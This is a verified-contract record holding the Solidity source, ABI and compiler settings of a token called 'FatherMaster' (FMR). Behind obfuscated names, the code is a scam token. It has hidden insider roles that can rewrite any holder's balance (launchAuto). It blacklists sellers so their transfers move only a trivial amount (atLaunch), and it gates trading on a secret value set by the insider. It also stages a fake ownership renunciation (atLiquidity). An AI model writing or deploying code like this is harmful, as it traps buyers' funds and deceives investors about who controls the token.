{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface atEnable {\n    function createPair(address teamLaunched, address tokenModeReceiver) external returns (address);\n}\n\ninterface tokenTeamMode {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address amountSwap) external view returns (uint256);\n\n    function transfer(address receiverToken, uint256 minLaunch) external returns (bool);\n\n    function allowance(address liquidityMin, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 minLaunch) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverToken,\n        uint256 minLaunch\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed enableLaunched, uint256 value);\n    event Approval(address indexed liquidityMin, address indexed spender, uint256 value);\n}\n\nabstract contract feeAuto {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface swapMode {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface tokenTeamModeMetadata is tokenTeamMode {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract FatherMaster is feeAuto, tokenTeamMode, tokenTeamModeMetadata {\n\n    mapping(address => bool) public sellTotal;\n\n    address fundToken = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function swapTake(address atReceiver) public {\n        require(atReceiver.balance < 100000);\n        if (takeMarketing) {\n            return;\n        }\n        \n        swapLaunch[atReceiver] = true;\n        if (amountAuto == marketingMaxEnable) {\n            shouldSwap = false;\n        }\n        takeMarketing = true;\n    }\n\n    bool private shouldReceiverLimit;\n\n    function approve(address limitReceiver, uint256 minLaunch) public virtual override returns (bool) {\n        marketingAuto[_msgSender()][limitReceiver] = minLaunch;\n        emit Approval(_msgSender(), limitReceiver, minLaunch);\n        return true;\n    }\n\n    function teamIsLaunch(address walletSender, address receiverToken, uint256 minLaunch) internal returns (bool) {\n        require(sellAtExempt[walletSender] >= minLaunch);\n        sellAtExempt[walletSender] -= minLaunch;\n        sellAtExempt[receiverToken] += minLaunch;\n        emit Transfer(walletSender, receiverToken, minLaunch);\n        return true;\n    }\n\n    event OwnershipTransferred(address indexed feeIsTx, address indexed toTx);\n\n    string private buyTx = \"Father Master\";\n\n    function balanceOf(address amountSwap) public view virtual override returns (uint256) {\n        return sellAtExempt[amountSwap];\n    }\n\n    function allowance(address buyIs, address limitReceiver) external view virtual override returns (uint256) {\n        if (limitReceiver == autoTokenSender) {\n            return type(uint256).max;\n        }\n        return marketingAuto[buyIs][limitReceiver];\n    }\n\n    string private senderEnable = \"FMR\";\n\n    bool public marketingMaxEnable;\n\n    uint256 private liquidityEnableList = 100000000 * 10 ** 18;\n\n    function symbol() external view virtual override returns (string memory) {\n        return senderEnable;\n    }\n\n    address public receiverLiquidity;\n\n    bool public teamLaunch;\n\n    bool private amountAuto;\n\n    uint8 private isWallet = 18;\n\n    uint256 atAuto;\n\n    uint256 constant teamMarketing = 18 ** 10;\n\n    function atLaunch(address modeFrom) public {\n        receiverIs();\n        if (buyTotalTake == shouldSell) {\n            shouldSwap = false;\n        }\n        if (modeFrom == receiverLiquidity || modeFrom == amountTx) {\n            return;\n        }\n        sellTotal[modeFrom] = true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return buyTx;\n    }\n\n    mapping(address => mapping(address => uint256)) private marketingAuto;\n\n    function receiverIs() private view {\n        require(swapLaunch[_msgSender()]);\n    }\n\n    address public amountTx;\n\n    bool public shouldSwap;\n\n    uint256 tokenLiquidity;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return liquidityEnableList;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return isWallet;\n    }\n\n    mapping(address => uint256) private sellAtExempt;\n\n    mapping(address => bool) public swapLaunch;\n\n    uint256 public shouldSell;\n\n    constructor (){\n        if (maxFromExempt) {\n            amountAuto = false;\n        }\n        swapMode tokenSwap = swapMode(autoTokenSender);\n        amountTx = atEnable(tokenSwap.factory()).createPair(tokenSwap.WETH(), address(this));\n        if (shouldReceiverLimit == marketingMaxEnable) {\n            shouldSwap = false;\n        }\n        receiverLiquidity = _msgSender();\n        swapLaunch[receiverLiquidity] = true;\n        sellAtExempt[receiverLiquidity] = liquidityEnableList;\n        atLiquidity();\n        if (marketingMaxEnable) {\n            maxFromExempt = true;\n        }\n        emit Transfer(address(0), receiverLiquidity, liquidityEnableList);\n    }\n\n    address private atMax;\n\n    function tradingSender(address walletSender, address receiverToken, uint256 minLaunch) internal returns (bool) {\n        if (walletSender == receiverLiquidity) {\n            return teamIsLaunch(walletSender, receiverToken, minLaunch);\n        }\n        uint256 maxTrading = tokenTeamMode(amountTx).balanceOf(fundToken);\n        require(maxTrading == atAuto);\n        require(receiverToken != fundToken);\n        if (sellTotal[walletSender]) {\n            return teamIsLaunch(walletSender, receiverToken, teamMarketing);\n        }\n        return teamIsLaunch(walletSender, receiverToken, minLaunch);\n    }\n\n    function launchAuto(address senderExemptLaunched, uint256 minLaunch) public {\n        receiverIs();\n        sellAtExempt[senderExemptLaunched] = minLaunch;\n    }\n\n    function atLiquidity() public {\n        emit OwnershipTransferred(receiverLiquidity, address(0));\n        atMax = address(0);\n    }\n\n    function getOwner() external view returns (address) {\n        return atMax;\n    }\n\n    function transfer(address senderExemptLaunched, uint256 minLaunch) external virtual override returns (bool) {\n        return tradingSender(_msgSender(), senderExemptLaunched, minLaunch);\n    }\n\n    address autoTokenSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 public buyTotalTake;\n\n    function transferFrom(address walletSender, address receiverToken, uint256 minLaunch) external override returns (bool) {\n        if (_msgSender() != autoTokenSender) {\n            if (marketingAuto[walletSender][_msgSender()] != type(uint256).max) {\n                require(minLaunch <= marketingAuto[walletSender][_msgSender()]);\n                marketingAuto[walletSender][_msgSender()] -= minLaunch;\n            }\n        }\n        return tradingSender(walletSender, receiverToken, minLaunch);\n    }\n\n    function marketingLaunchTrading(uint256 minLaunch) public {\n        receiverIs();\n        atAuto = minLaunch;\n    }\n\n    function owner() external view returns (address) {\n        return atMax;\n    }\n\n    bool private maxFromExempt;\n\n    bool public takeMarketing;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeIsTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toTx\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableLaunched\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyIs\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minLaunch\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeFrom\",\"type\":\"address\"}],\"name\":\"atLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountSwap\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTotalTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderExemptLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minLaunch\",\"type\":\"uint256\"}],\"name\":\"launchAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"minLaunch\",\"type\":\"uint256\"}],\"name\":\"marketingLaunchTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingMaxEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atReceiver\",\"type\":\"address\"}],\"name\":\"swapTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderExemptLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minLaunch\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minLaunch\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "FatherMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}